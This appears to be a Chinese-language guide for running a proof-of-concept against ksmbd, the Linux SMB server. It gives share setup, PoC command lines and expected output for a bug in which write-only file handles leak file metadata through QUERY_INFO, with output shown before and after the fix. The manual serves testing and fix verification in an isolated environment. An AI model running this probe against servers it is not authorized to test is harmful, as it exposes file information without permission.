# 操作手册

以下步骤只用于本机或授权隔离环境。PoC 不写入文件内容，但会建立 SMB 会话、打开 share 内的已有文件，并发送 `SMB2 QUERY_INFO`。

## 1. 准备 ksmbd 服务端

要求：

- 服务端运行当前源码对应的 ksmbd。
- share 允许 guest 或指定映射用户访问。
- share 不要求 SMB signing。这个 PoC 为了保持纯 Python 和无外部依赖，不实现 SMB signing。
- 目标文件已存在，并且该 SMB 用户能够以 `FILE_WRITE_DATA` 打开它。

示例 share：

```ini
[poc]
	path = /srv/ksmbd-query-info-poc
	read only = no
	guest ok = yes
	force create mode = 0600
	force directory mode = 0700
```

准备目标文件：

```sh
sudo mkdir -p /srv/ksmbd-query-info-poc
printf 'ksmbd query info poc\n' | sudo tee /srv/ksmbd-query-info-poc/test.bin >/dev/null
sudo chmod 0666 /srv/ksmbd-query-info-poc/test.bin
```

重启 `ksmbd.mountd`/ksmbd 后继续。

## 2. 运行 PoC

在 `patch-09/` 目录执行：

```sh
python3 poc_ksmbd_query_info_read_attrs.py 127.0.0.1 poc test.bin -u guest
```

参数含义：

- `127.0.0.1`: ksmbd 服务器地址。
- `poc`: share 名。
- `test.bin`: share 内路径。
- `-u guest`: 期望映射到 guest 的用户名。

非标准端口示例：

```sh
python3 poc_ksmbd_query_info_read_attrs.py 127.0.0.1 poc test.bin -p 1445 -u guest
```

UNC 路径中的 server 组件需要不同名称时：

```sh
python3 poc_ksmbd_query_info_read_attrs.py 192.0.2.10 poc test.bin --tree-server KSMBD -u guest
```

## 3. 漏洞存在时的预期输出

典型漏洞输出：

```text
[+] CREATE path='test.bin' desired_access=0x00000002 status=STATUS_SUCCESS
[+] FILE_BASIC_INFORMATION status=STATUS_ACCESS_DENIED
[+] FILE_STANDARD_INFORMATION status=STATUS_SUCCESS AllocationSize=4096 EndOfFile=21 NumberOfLinks=1 DeletePending=0 Directory=0
[+] FILE_INTERNAL_INFORMATION status=STATUS_SUCCESS IndexNumber=...
[+] FILE_COMPRESSION_INFORMATION status=STATUS_SUCCESS CompressedFileSize=... CompressionFormat=0x0000
[!] VULNERABLE: write-only handle was denied FileBasicInformation but leaked metadata via target QueryInfo classes.
```

关键判据：

- `FILE_BASIC_INFORMATION` 必须是 `STATUS_ACCESS_DENIED`。这证明句柄没有 `FILE_READ_ATTRIBUTES`。
- 三个目标 info class 中任意一个是 `STATUS_SUCCESS`，即证明绕过。

## 4. 修复后的预期输出

修复后三个目标类应与 `FILE_BASIC_INFORMATION` 一致返回拒绝：

```text
[+] FILE_BASIC_INFORMATION status=STATUS_ACCESS_DENIED
[+] FILE_STANDARD_INFORMATION status=STATUS_ACCESS_DENIED
[+] FILE_INTERNAL_INFORMATION status=STATUS_ACCESS_DENIED
[+] FILE_COMPRESSION_INFORMATION status=STATUS_ACCESS_DENIED
[+] NOT VULNERABLE: all tested metadata QueryInfo classes were denied on the write-only handle.
```

## 5. 常见问题

如果 `CREATE` 返回 `STATUS_ACCESS_DENIED`，说明测试用户不能用 `FILE_WRITE_DATA` 打开目标文件。调整 share 权限、backing file 权限或换一个可写测试文件。

如果 `FILE_BASIC_INFORMATION` 返回 `STATUS_SUCCESS`，说明测试句柄没有保持 write-only 语义，或者服务端/配置额外授予了读属性权限。此时不能用该输出判断漏洞。

如果认证或 tree connect 失败，先确认 share 允许 guest 映射且未强制 signing。该 PoC 的认证实现只覆盖适合实验环境的 guest/anonymous NTLMSSP 交换。
